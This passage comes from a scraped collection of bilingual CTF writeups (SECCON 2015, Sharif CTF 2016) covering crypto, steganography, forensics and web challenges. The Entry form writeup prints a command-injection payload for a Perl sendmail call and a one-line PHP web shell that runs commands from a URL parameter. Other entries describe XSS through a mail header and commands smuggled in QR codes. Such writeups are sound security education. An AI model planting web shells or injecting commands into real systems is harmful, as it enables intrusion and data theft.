aż w końcu zadziałał z polem `Date`.\n\n![](./solution.png)\n\n`SECCON{TsuriboriWebBros/2015.12.17620}\n\n\n### ENG version\n\nAttached was a heavily obfuscated .NET application. It was a simulated webbrowser in which a user logged in to his webmail.\n\n![](./app.png)\n\nAt first we tried to tacke the application itself. We partly managed to deobfuscate the binary with a `de4dot` tool. Then we created another .NET application and loaded the original program by reflection:\n\n```csharp\nvar assembly = Assembly.LoadFile(\"hakoniwaWebMail.exe\");\n```\n\nThat allows us to manually instantiate classes and invoke methods. There were two form classes in the main namespace: `FLAGgenerator` and `frmMain`. The former gave us a flag, but it was a fake. The former was indeed the main form of the app and instantiating the class and showing the form basically run the whole simulation but now we could interact with it:\n\n```csharp\nvar form = (hakoniwaWebMail.frmMain)Activator.CreateInstance(assembly.GetTypes()[7]);\nvar browser = (WebBrowser)GetControls(form)[7];\n```\n\nThat way we could simply dump the contents of displayed page in the integrated/simulated webbrowser:\n\n```csharp\nConsole.WriteLine(browser.DocumentText);\n```\n\nBut all we got was:\n\n```html\n<html><style>.b{font-weight:bold;}(...)</style><body>\n<script>var navigator=new Object;navigator.userAgent='This is NOT a flag. Use XSS to obtain it.';</script>\n<table border=3 cellspacing=0 cellpadding=0 width=100% height=100%>(...)\n```\n\nOne possibility at this point was to dig deep in the obfuscated application and reverse engineer it and another to read the task name, category and points again: XSS, web, 200p. Well then, if the application is a simulated webmail, maybe we can send an actual email. And there it was: it was also a mail server running on standard port 25:\n\n```\nTCP    127.0.0.1:25           0.0.0.0:0              LISTENING       6512\n[hakoniwaWebMail.exe]\n```\n\nWe tried several mail headers for the XSS and it finally worked with the `Date` header.\n\n![](./solution.png)\n\n`SECCON{TsuriboriWebBros/2015.12.17620}\n", "timestamp": "2025-10-21T13:31:21.864332"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/entry_form_web_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/entry_form_web_100/README.md", "content": "##Entry form (Web/Network, 100p)\n\n```\nhttp://entryform.pwn.seccon.jp/register.cgi\n\n(Do not use your real mail address.)\n```\n\n###PL\n[ENG](#eng-version)\n\nFormularz pod podanym linkiem pozwalał nam na podanie adresu e-mail oraz nazwy użytkownika. Po wysłaniu podziękował nam za podanie informacji, ale w rzeczywistości niczego nie wysyłał. Krótka zabawa z modyfikacją wartości niczego nam nie dała więc postanowiliśmy się rozejrzeć. Okazało się, że serwer webowy ma włączone listowanie i pod `http://entryform.pwn.seccon.jp/` znaleźliśmy dodatkowo katalog `SECRETS` oraz plik `register.cgi_bak`. Pierwszy katalog nie był dostępny, ale drugi z plików dał nam kod źródłowy naszego formularza.\n\nNajciekawsza część wyglądała następująco:\n\n```perl\nif($q->param(\"mail\") ne '' && $q->param(\"name\") ne '') {\n  open(SH, \"|/usr/sbin/sendmail -bm '\".$q->param(\"mail\").\"'\");\n  print SH \"From: keigo.yamazaki\\@seccon.jp\\nTo: \".$q->param(\"mail\").\"\\nSubject: from SECCON Entry Form\\n\\nWe received your entry.\\n\";\n  close(SH);\n\n  open(LOG, \">>log\"); ### <-- FLAG HERE ###\n  flock(LOG, 2);\n  seek(LOG, 0, 2);\n  print LOG \"\".$q->param(\"mail\").\"\\t\".$q->param(\"name\").\"\\n\";\n  close(LOG);\n\n  print \"<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>\";\n  exit;\n}\n```\n\nJest to skrypt w Perlu, w którym od razu rzuca się w oczy możliwość wywołania własnego polecenia zawierając go w parametrze `mail`.\n\nPotwierdza nam to wysłanie `';ls -la;'`. Według kodu źródłowego flagę mamy znaleźć w pliku `log`. Niestety wygląda na to, że skrypt perlowy nie ma praw do jego odczytania. W takim razie sprawdziliśmy co znajdowało się w uprzednio niedostępnym dla nas katalogu `SECRETS`. Znajdował się tam plik `backdoor123.php` o prostym kodzie: `<pre><?php system($_GET['cmd']); ?></pre>`. Wywołanie w nim polecenia `cat ../log` dało nam flagę:\n\n`SECCON{Glory_will_shine_on_you.}`\n\n### ENG version\n\nOpening the provided link gave us a form asking for an e-mail and a username. After submitting it displayed a thank you message, but didn't really sent us anything. After some time playing with the values we decided to look around. It turned out that the webserver had listing enabled and going to `http://entryform.pwn.seccon.jp/` gave us a `SECRETS` directory and a `register.cgi_bak` file. The former wasn't available, but the latter file gave us a source code of our form.\n\nThe most interesing part was the following:\n\n```perl\nif($q->param(\"mail\") ne '' && $q->param(\"name\") ne '') {\n  open(SH, \"|/usr/sbin/sendmail -bm '\".$q->param(\"mail\").\"'\");\n  print SH \"From: keigo.yamazaki\\@seccon.jp\\nTo: \".$q->param(\"mail\").\"\\nSubject: from SECCON Entry Form\\n\\nWe received your entry.\\n\";\n  close(SH);\n\n  open(LOG, \">>log\"); ### <-- FLAG HERE ###\n  flock(LOG, 2);\n  seek(LOG, 0, 2);\n  print LOG \"\".$q->param(\"mail\").\"\\t\".$q->param(\"name\").\"\\n\";\n  close(LOG);\n\n  print \"<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>\";\n  exit;\n}\n```\n\nIt's a Perl script and the first thing that comes to mind is the possibility of a bash command injection in the `mail` parameter.\n\nWe confirm it by sending `';ls -la;'`. According to the source code we were supposed to find the flag in the `log` file. Unfortunately it seemed that the Perl script didn't have a read access. In that case we tried accessing the previousely inaccessible `SECRETS` directory. There was a `backdoor123.php` file with a very simple source code: `<pre><?php system($_GET['cmd']); ?>`. Invoking a `cat ../log` gave us the flag:\n\n`SECCON{Glory_will_shine_on_you.}`\n", "timestamp": "2025-10-21T13:31:22.130538"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/last_crypto_50/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/last_crypto_50/README.md", "content": "##Last Challenge (Thank you for playing) (Misc/Crypto, 50p)\n\n```\nex1\nCipher:PXFR}QIVTMSZCNDKUWAGJB{LHYEO\nPlain: ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\n\nex2\nCipher:EV}ZZD{DWZRA}FFDNFGQO\nPlain: {HELLOWORLDSECCONCTF}\n\nquiz\nCipher:A}FFDNEA}}HDJN}LGH}PWO\nPlain: ??????????????????????\n```\n\n###PL\n[ENG](#eng-version)\n\nDostajemy do rozwiązania prost szyfr podstawieniowy. Na podsatwie pierwszej pary plaintext-ciphertext generujemy mapę podstawień a następnie dekodujemy flagę:\n\n```python\ndata1 = \"PXFR}QIVTMSZCNDKUWAGJB{LHYEO\"\nres1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\"\nsub = dict(zip(data1, res1))\nprint(\"\".join([sub[letter] for letter in \"A}FFDNEA}}HDJN}LGH}PWO\"]))\n```\n\n`SECCON{SEEYOUNEXTYEAR}`\n\n\n### ENG version\n\nWe get a very simple substitution cipher to solve. Using the first plaintext-ciphertext pair we genrate a substitution map and the we decode the flag:\n\n```python\ndata1 = \"PXFR}QIVTMSZCNDKUWAGJB{LHYEO\"\nres1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\"\nsub = dict(zip(data1, res1))\nprint(\"\".join([sub[letter] for letter in \"A}FFDNEA}}HDJN}LGH}PWO\"]))\n```\n\n`SECCON{SEEYOUNEXTYEAR}`", "timestamp": "2025-10-21T13:31:22.337871"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/paillier_crypto_200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/paillier_crypto_200/README.md", "content": "##Find the prime numbers (Crypto, 200p)\n\n###PL\n[ENG](#eng-version)\n\nDostajemy [kod](paillier.txt) skryptu pracującego na serwerze. Skrypt szyfruje pewną wiadomość za pomocą szyfru Pailliera a następnie podaje nam zaszyfrowaną wiadomość oraz kilka innych parametrów. Naszym zadaniem jest złamać szyfr.\nSzyfr jest lekko zbliżony do szyfrowania metodą RSA i jego łamanie przebiega w dość podobny sposób. Pierwszym krokiem do złamania szyfru jest uzyskanie informacji o liczbie `n` która jest podstawą dla operacji reszty z dzielenia podczas szyfrowania. Wykorzystujemy tutaj informacje przychodzące z serwera:\n\n```python\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n```\n\nJak widać serwer za każdym razem wypisuje nam 3 liczby, z których każda jest resztą z dzielenia przez `n^2`. Dzięki temu możemy szybko ustalić pewne dolne ograniczenie dla liczby `n`, ponieważ liczba `n^2` nie może być większa niż największa z liczb którą dostaniemy z serwera. Dodatkowo wiemy, że\n\n`h = (c * o) % (n * n)`\n\nwięc możemy wykorzystać tą zależność do testowania czy aktualnie testowane `n` jest szukaną liczbą.\n\nOperacje pozyskiwania liczby `n` przeprowadzamy skryptem:\n\n```python\nlower_bound = 0\nbound_lock = threading.Lock()\n\n\ndef seed_collector():\n    global bound_lock\n    global lower_bound\n    while True:\n        url = \"http://pailler.quals.seccon.jp/cgi-bin/pq.cgi\"\n        data = str(requests.get(url).content)\n        c, o, h = map(int, re.findall(\"\\d+\", data))\n        potential_n = int(math.sqrt(max([c, o, h])))\n        bound_lock.acquire()\n        if potential_n > lower_bound:\n            lower_bound = potential_n\n            print(\"new lower bound \" + str(lower_bound))\n        bound_lock.release()\n        print(c, o, h)\n        sleep(3)\n\n\ndef bruter():\n    global lower_bound\n    global bound_lock\n    bound = 1\n    while True:\n        bound_lock.acquire()\n        current = max([bound, lower_bound])\n        lower_bound = current\n        if valid_n(lower_bound):\n            print(\"n=\" + str(lower_bound))\n            return\n        else:\n            lower_bound += 1\n        bound_lock.release()\n```\n\nSkrypt opiera się na dwóch wątkach. Pierwszy odpytuje serwer o kolejne trójki liczb i szuka największego dolnego ograniczenia dla liczby `n`. \nDrugi iteruje po kolejnych możliwych liczbach `n` i na podstawie jednego z równań pozyskanych z serwera sprawdza czy jest poprawna.\nW ten sposób uzyskujemy `n = 2510510339` które faktoryzujemy do `p = 42727` i `q = 58757`. Dysponując tymi wartościami możemy przejść bezpośrednio do dekodowania wiadomości. Zgodnie z opisem na wikipedii wyliczamy parametry `lambda` oraz `mi` i za ich pomocą dekodujemy wiadomość:\n\n```python\nlbd = 1255204428  # lcm(p-1, q-1)\ng = n + 1\nx = L(pow(g, lbd, n * n), n)\nmi = int(modinv(n, x))\nc = 2662407698910651121  # example ciphertext from server\nm = L(pow(c, lbd, n * n), n) * pow(mi, 1, n)\nprint(m % n)\n```\n\nCo daje nam: `1510490612` a umieszczenie tej liczby na serwerze daje flagę: `SECCON{SECCoooo_oooOooo_ooooooooN}`\n\nKompletny użyty skrypt znajduje sie [tutaj](crypto_paillier.py)\n\n### ENG version\n\nWe get the [source code](paillier.txt) of a script that is used on the server. The cipher encodes a certain message using Paillier cipher and the returns to us the encoded message and some parameters. Our task is to break the code.\nThe cipher is a bit like RSA and the approach to break it is very similar. First step is to get the `n` number which is the basis for all modulo operations in the cipher. For this we use data we get from server:\n\n```python\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n```\n\nAs can be seen, the server prints 3 numbers, each one is a reminder after division by `n^2`. This means we can quickly make a lower bound for `n` since `n^2` can't be bigger than the biggest number we get from server. On top of that we know that:\n\n`h = (c * o) % (n * n)`\n\nso we can use this equation to quickly test if the `n` we are testing is the number we are looking for.\n\nRecovery of `n` is done with script:\n\n```python\nlower_bound = 0\nbound_lock = threading.Lock()\n\n\ndef seed_collector():\n    global bound_lock\n    global lower_bound\n    while True:\n        url = \"http://pailler.quals.seccon.jp/cgi-bin/pq.cgi\"\n        data = str(requests.get(url).content)\n        c, o, h = map(int, re.findall(\"\\d+\", data))\n        potential_n = int(math.sqrt(max([c, o, h])))\n        bound_lock.acquire()\n        if potential_n > lower_bound:\n            lower_bound = potential_n\n            print(\"new lower bound \" + str(lower_bound))\n        bound_lock.release()\n        print(c, o, h)\n        sleep(3)\n\n\ndef bruter():\n    global lower_bound\n    global bound_lock\n    bound = 1\n    while True:\n        bound_lock.acquire()\n        current = max([bound, lower_bound])\n        lower_bound = current\n        if valid_n(lower_bound):\n            print(\"n=\" + str(lower_bound))\n            return\n        else:\n            lower_bound += 1\n        bound_lock.release()\n```\n\nThe script uses two threads. First one queries the server for triplets and looks for bigger lower bound for `n`.\nThe second iterates over possible `n` and using one of the equations from the server it is checking if the currently tested value is the real `n`.\nThis way almost instantly we get `n = 2510510339` which we factor into `p = 42727` and `q = 58757`.\nWith those two values we can recover the private key and start decoding the cipher. We follow the decription on wikipedia to calculate the `lambda` and `mi` parameters and we use them to decode the message:\n\n```python\nlbd = 1255204428  # lcm(p-1, q-1)\ng = n + 1\nx = L(pow(g, lbd, n * n), n)\nmi = int(modinv(n, x))\nc = 2662407698910651121  # example ciphertext from server\nm = L(pow(c, lbd, n * n), n) * pow(mi, 1, n)\nprint(m % n)\n```\n\nWhich gives us: `1510490612` and placing this number on the server gives the flag: `SECCON{SECCoooo_oooOooo_ooooooooN}`\n\nWhole script is available [here](crypto_paillier.py)\n", "timestamp": "2025-10-21T13:31:22.549281"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/paillier_crypto_200/paillier.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/paillier_crypto_200/paillier.txt", "content": "#!/usr/bin/env python\n\nimport sys\nimport random\nimport fcntl\nimport os\nimport json\nimport random\nimport time\n\ndef read_json(name):\n\twith open(name) as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tv = json.loads(f.read())\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\treturn v\n\ndef write_json(name, v):\n\twith open(name, \"w\") as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tf.write(json.dumps(v))\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\treturn\n\nprint \"Content-Type: text/html\"\nprint\nprint \"<html>\"\nprint \"<body>\"\nprint \"<pre>\"\n\nwhile 1:\n\tt = int(time.time())\n\tw = read_json(\"access.json\")\n\te = os.environ[\"REMOTE_ADDR\"]\n\tif not e in w.keys():\n\t\tw.setdefault(e, {})\n\t\tw[e].setdefault(\"outp\", \"\")\n\t\tw[e].setdefault(\"time\", 0)\n\telse:\n\t\tif t < w[e][\"time\"]:\n\t\t\tprint w[e][\"outp\"]\n\t\t\tbreak\n\t\n\tv = read_json(\"data.json\")\n\t\n\ta = int(v[\"p\"])\n\tb = int(v[\"q\"])\n\tn = (a * b)\n\tl = (a - 1) * (b - 1)\n\tr = l\n\td = 1\n\twhile 1:\n\t\td = ((n // r + 1) * d) % n\n\t\tr = (d * l) % n\n\t\tif r == 1:\n\t\t\tbreak\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n\t\n\tz = \"QUERY_STRING\"\n\tif z in os.environ and os.environ[z] != \"\":\n\t\tif w[e][\"time\"] < t and os.environ[z] == v[\"num\"]:\n\t\t\tprint \"SECCON{\" + v[\"flag\"] + \"}\"\n\t\tw[e][\"time\"] = t + 60\n\t\tw[e][\"outp\"] = q\n\telse:\n\t\tw[e][\"time\"] = t + 3\n\t\tw[e][\"outp\"] = q\n\t\n\twrite_json(\"access.json\", w)\n\t\n\twith open(\"/var/www/log.txt\", \"a\") as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tf.write(q + \"\\n\")\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\tbreak\n\nprint \"</pre>\"\nprint \"</body>\"\nprint \"</html>\"\n", "timestamp": "2025-10-21T13:31:22.622090"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/stegano_1_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/stegano_1_100/README.md", "content": "## Steganography 1 (Stegano, 100p)\n\n    Find image files in the file\n    ![](MrFusion.gpjb)\n    Please input flag like this format-->SECCON{*** ** **** ****}\n\n###PL\n[ENG](#eng-version)\n\nDostajemy plik o rozszerzeniu .gpjb. Polecenie `file` rozpoznaje go jako gif:\n\n![](out.0.gif)\n\nAle po otworzeniu tego pliku w hexedytorze okazuje się że plik ten składa się w rzeczywistości z dużej liczby obrazów sklejonych w jeden.\nDomyślamy się że \"gpjb\" pochodzi od rozszerzeń .gif, .png, .jpg oraz .bmp.\n\nPiszemy na szybko skrypt w pythonie który dzieli te pliki na fragmenty (szukając odpowiednich headerów formatów):\n\n```python\nimport re\n\ndata = open('MrFusion.gpjb', 'rb').read()\n\ndef findndx(str, data):\n    return [m.start() for m in re.finditer(str, data)]\n\next = {\n    '.gif': 'GIF89a',\n    '.png': '\\x89PNG',\n    '.bmp': 'BM',\n    '.jpg': '\\xFF\\xD8\\xFF\\xE0'\n}\n\nfor ext, pat in ext.iteritems():\n    for n in findndx(pat, data):\n        open('out.' + str(n) + ext, 'wb').write(data[n:])\n```\n\nNastępnie uruchamiamy go i otrzymujemy sporo obrazów, z których każdy odpowiada jednemu znakowi:\n\n![](folder.png)\n\nPo przepisaniu:\n\n    SECCON{OCT2120150728}\n\nZ powodu błedu w zadaniu flaga nie przechodziła sprawdzenia, więc do opisu zadania doszła informacja o wymaganym formacie flagi, więc ostateczna flaga:\n\n    SECCON{OCT 21 2015 0728}\n\n\n### ENG version\n\nWe are given a file with .gpjb extension. `File` command recognises it as a gif:\n\n![](out.0.gif)\n\nBut after checking the file in hexeditor it turns out that the file is composed of large number of concantenated images.\nWe guess that \"gpjb\" extension stands for gif, png, jpg and bmp file formats.\n\nWe have written quick and dirty script to split file into fragments (according to format headers):\n\n```python\nimport re\n\ndata = open('MrFusion.gpjb', 'rb').read()\n\ndef findndx(str, data):\n    return [m.start() for m in re.finditer(str, data)]\n\next = {\n    '.gif': 'GIF89a',\n    '.png': '\\x89PNG',\n    '.bmp': 'BM',\n    '.jpg': '\\xFF\\xD8\\xFF\\xE0'\n}\n\nfor ext, pat in ext.iteritems():\n    for n in findndx(pat, data):\n        open('out.' + str(n) + ext, 'wb').write(data[n:])\n```\n\nAfter execution, script generated a lot of images, each of which represented single flag character:\n\n![](folder.png)\n\nAfter rewrite:\n\n    SECCON{OCT2120150728}\n\nBut because of bug in challenge checker, flag was not accepted by server. After that, description of challenge was changed, and final, accepted flag is:\n\n    SECCON{OCT 21 2015 0728}\n", "timestamp": "2025-10-21T13:31:23.198268"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/README.md", "content": "# Writeup Sharif CTF 2016\n\nTeam: c7f.m0d3, msm, other019, nazywam, shalom, akrasuski1\n\n### Table of contents\n* [Rail Dence Cipher (Crypto) 50](crypto_50_railfence)\n* [URE (Crypto) 100](crypto_100_ure)\n* [High-speed RSA Keygen (Crypto) 150](crypto_150_keygen)\n* [Hail Zeus (Crypto) 300](crypto_300_zeus)\n* [dMd (Reverse) 50](re_50_dmd)\n* [SRM (Reverse) 50](re_50_srm)\n* [Android App (Reverse) 100](re_100_android)\n* [Interpolation (Reverse) 200](re_200_interpolation)\n* [Serial (Reverse) 150](re_150_serial)\n* [Hackme (Web) 400](web_400_hackme)\n* Login to system (Pwn) 200\n* [SQL (Pwn) 150](pwn_150_sql)\n* [Kiuar (Pwn) 200](pwn_200_kiuar)\n* [Kick Tort Teen (Forensics) 50](for_50_tort)\n* [Dumped (Forensics) 100](for_100_dumped)\n* [We lost the Fashion Flag (Forensics) 100](for_100_fashion)\n* [Uagent (Forensics) 100](for_100_uagent)\n* Network Forensics (Forensics) 200\n* [Blocks (Forensics) 400](for_400_blocks)\n* [Asian Cheetah (Misc) 50](misc_50_cheetah)\n* [Hack By The Sound (Misc) 200](misc_200_hacksound)\n* [Impossible Game (Misc) 300](misc_300_impossible)\n* [SecCoding 1 (Misc) 100](misc_100_seccoding1)\n* [SecCoding 2 (Misc) 300](misc_300_seccoding2)\n", "timestamp": "2025-10-21T13:31:24.876510"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/crypto_100_ure/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/crypto_100_ure/README.md", "content": "﻿## URE (Crypto, 100p)\n\n    Universal ReEncryption\n\n\n###ENG\n[PL](#pl-version)\n\nWe have to change ciphertext in such way, that after decrypting plaintext is unchanged:\n\n![](task.png)\n\nWe need to think about what task authors really want from us - in mathematical terms. `r` and `s` are random numbers, so if we substitute them with another numbers\nplaintext will surely be unchanged.\n\nSo if we change `(g^r, h^r, g^s, mh^s)` to `(g^x, h^x, g^y, mh^y)` (for any x != r, y != s) then task is solved.\n\nWe tried few possibilities, but after not very long time we came to good substitution:\n\n    r -> r+r\n    s -> r+s\n\nOur solver demonstrating that substitution (basic algebra is enough to prove it right)\n\n```python\ndef solve(a, b, c, d, p):\n    # a = g^r \n    # b = h^r\n    # c = g^s\n    # d = m*g^xs\n    return [x%p for x in [\n        a*a, # g^(r+r)\n        b*b, # h^(r+r)\n        a*c, # g^(r+s)\n        d*b  # m*h^(r+s)\n    ]]\n```\n\nAnd our solution\n\n    a': 3287406693040037454338117703746186185132137914785835752950604845777415758360615360784432898128185782894436154048036406523549199332371675403330587908658389\n    b': 3106361558536896198315490627917020257039985078045091925325167930756012775219021778274538316287957153184501076513389822529518252243096913454042609623430979\n    c': 2705749471178411581710759303917406711797848509917528975018497036876024862091214580659339932929912633743841281275200381261759865873903109533343463983599973\n    d': 5373483039142295785146805049046423326555571326092245347871091138664843112902523040473342171017639501524961161720758693343930112103298610080325764680063048\n\n###PL version\n\nNaszym zadaniem jest zmiana ciphertextu tak, aby po zdeszyfrowaniu jego zawartośc (plaintext) się nie zmieniła:\n\n![](task.png)\n\nMożna się zastanowić czego dokładnie chcą od nas twórcy zadania w \"matematycznych\" słowach. `r` i `s` są liczbami losowymi, więc jeśli uda nam się je zamienić,\notrzymamy jednocześnie rozwiązanie zadania.\n\nTzn. jeśli bylibyśmy w stanie zamienić `(g^r, h^r, g^s, mh^s)` na `(g^x, h^x, g^y, mh^y)` (dla jakiegoś x != r, y != s) to mamy rozwiązanie zadania.\n\nPrzy rozwiązaniu było trochę kombinowania, ale szybko wpadliśmy na podmianę którą można było łatwo wykonać:\n\n    r -> r+r\n    s -> r+s\n\nNasz solver demonstrujący podmianę (podstawy algebry wystarczą żeby udowodnić poprawność rozwiązania):\n\n```python\ndef solve(a, b, c, d, p):\n    # a = g^r \n    # b = h^r\n    # c = g^s\n    # d = m*g^xs\n    return [x%p for x in [\n        a*a, # g^(r+r)\n        b*b, # h^(r+r)\n        a*c, # g^(r+s)\n        d*b  # m*h^(r+s)\n    ]]\n```\n\nI rozwiązanie:\n\n    a': 3287406693040037454338117703746186185132137914785835752950604845777415758360615360784432898128185782894436154048036406523549199332371675403330587908658389\n    b': 3106361558536896198315490627917020257039985078045091925325167930756012775219021778274538316287957153184501076513389822529518252243096913454042609623430979\n    c': 2705749471178411581710759303917406711797848509917528975018497036876024862091214580659339932929912633743841281275200381261759865873903109533343463983599973\n    d': 5373483039142295785146805049046423326555571326092245347871091138664843112902523040473342171017639501524961161720758693343930112103298610080325764680063048\n", "timestamp": "2025-10-21T13:31:25.195166"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/for_50_tort/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/for_50_tort/README.md", "content": "##Kick Tort Teen (Forensics, 50p)\n\tAnagram, anyone?\n[Download](data.xls)\n\n###ENG\n[PL](#pl-version)\n\n\nWe start by converting the xls file to csv. Then we load up the values into a python script that counts the number occurences:\n\n```python\noccurences = []\nfor i in range(1000):\n\toccurences.append(0)\n\nfor y in data:\n\tfor x in y:\n\t\toccurences[x]=occurences[x]+1\n\nfor i in range(len(occurences)):\n\tprint(i, occurences[i])`\n```\n\nIt turns out that there are 256 different numbers in the file, let's try swapping each number with its index in the list of all numbers that appear in the file. [decode.cpp](decode.cpp)\n\nWe get a ELF file that prints out the flag:\n\n`SharifCTF{5bd74def27ce149fe1b63f2aa92331ab}`\n\n\n###PL version\n\nPierwsze co zrobimy to przekonwertujemy spredsheeta do csv. Wartości wczytamy do prostego programu w pythonie zwracającego wystąpienia poszczególnych liczb: \n\n```python\noccurences = []\nfor i in range(1000):\n\toccurences.append(0)\n\nfor y in data:\n\tfor x in y:\n\t\toccurences[x]=occurences[x]+1\n\nfor i in range(len(occurences)):\n\tprint(i, occurences[i])`\n```\n\nOkazuje się, że w pliku znajduje się 256 różnych liczb, spróbujmy zatem zastąpić każdą liczbę jej pozycją w liście wszystkich liczb które występują w tekście. [decode.cpp](decode.cpp)\n\nDostajemy plik ELF który po uruchomieniu wypisuje nam flagę: \n\n`SharifCTF{5bd74def27ce149fe1b63f2aa92331ab}`\n", "timestamp": "2025-10-21T13:31:25.859656"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/misc_100_seccoding1/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/misc_100_seccoding1/README.md", "content": "﻿## SecCoding (Misc, 100p)\n\n> You should fix vulnerabilities of the given source code, WITHOUT changing its normal behaviour. Link \n\n###ENG\n[PL](#pl-version)\n\nWe are given following code, and are tasked with repairing bugs and vulnerabilities in it:\n\n```cpp\n#include <vector>\n#include <iostream>\n#include <windows.h>\n\nusing namespace std;\n\n\nint main()\n{\n\tvector<char> str(MAX_PATH);\n\t\n\tcout << \"Enter your name: \";\n\tcin >> str.data();\n\n\tcout << \"Hello \" << str.data() << \" :)\" << endl;\n\n\treturn -14;\n}\n```\n\nThis code is so bad, that if anyone seriously wrote code like that, he should immediately give up on programming and become baker instead.\n\nWe don't even try to repair this program, we just scrap it and write everything from zero:\n\n```cpp\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nint main() {\n\tstring str;\n\n\tcout << \"Enter your name: \";\n\tcin >> str;\n\n\tcout << \"Hello \" << str << \" :)\" << endl;\n\n\treturn -14;\n}\n```\n\nChallenge solved.\n\n###PL version\n\nDostajemy taki kod i mamy go poprawić:\n\n```cpp\n#include <vector>\n#include <iostream>\n#include <windows.h>\n\nusing namespace std;\n\n\nint main()\n{\n\tvector<char> str(MAX_PATH);\n\t\n\tcout << \"Enter your name: \";\n\tcin >> str.data();\n\n\tcout << \"Hello \" << str.data() << \" :)\" << endl;\n\n\treturn -14;\n}\n```\n\nJest on tak dramatycznie napisany, że jeśli ktoś faktycznie napisał taki kod powinien prawdopodobnie zrezygnować z kariery programisty i przemyśleć karierę piekarza.\n\nDarujemy sobie poprawki i po prostu piszemy go od zera:\n\n```cpp\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nint main() {\n\tstring str;\n\n\tcout << \"Enter your name: \";\n\tcin >> str;\n\n\tcout << \"Hello \" << str << \" :)\" << endl;\n\n\treturn -14;\n}\n```\n\nZadanie rozwiązane.\n", "timestamp": "2025-10-21T13:31:26.114403"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-02-05-sharif/pwn_200_kiuar/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-02-05-sharif/pwn_200_kiuar/README.md", "content": "## Kiuar (pwn, 200p)\n\n    telnet ctf.sharif.edu 12432\n\n###ENG\n[PL](#pl-version)\n\nFirst thing we receive in this task is request for proof of work - so we had to write a quick script calculating it for us.\nAfter submitting it, we receive some non-ASCII bytes and a message telling us we have 10s to reply.\n\nSaving those unknown bytes to file and checking it using `file` command, we find it's a zlib-compressed data: `Send your\nQR code:`.\n\nSending anything afterwards tells us that we need to send exactly 200 bytes - and if we do it, the message tells us that\nthe input is not properly compressed. Finally, when we send zlib-compressed string \"aaa\" padded with zeros to 200 bytes,\nwe receive `Sorry, no decode delegate for this image :|`. Googling this message tells us that it's a generic ImageMagick\nerror message - apparently we need to send an image. At this point we were prertty certain it has to be zlib-compressed\nimage file containing QR code. Sending QR with \"aaa\" text gives us:\n```\nProcessing the received command...\nThe output of your command is large, I only send 18 bytes of it :P \nSorry, command not\n```\nSo probably our text was executed as a command. Sending QR with `ls` confirms that - there was a `flag` file.\nWe still had to work around limitation of command size (200 bytes limit for QR image) and output limit of 18 bytes.\nFinally, using `tail -c 40 flag` we were able to get the flag chunk by chunk.\n\n###PL version\n\nPierwsze co dostajemy po połączeniu się z serwerem, to prośba o `proof of work`. Napisaliśmy więc skrypt realizujący ją,\npo czym otrzymaliśmy trochę bajtów spoza ASCII i wiadomość, że mamy 10s na odpowiedź.\n\nPo zapisaniu tych nieznanych bajtów do pliku i sprawdzeniu ich poleceniem `file` 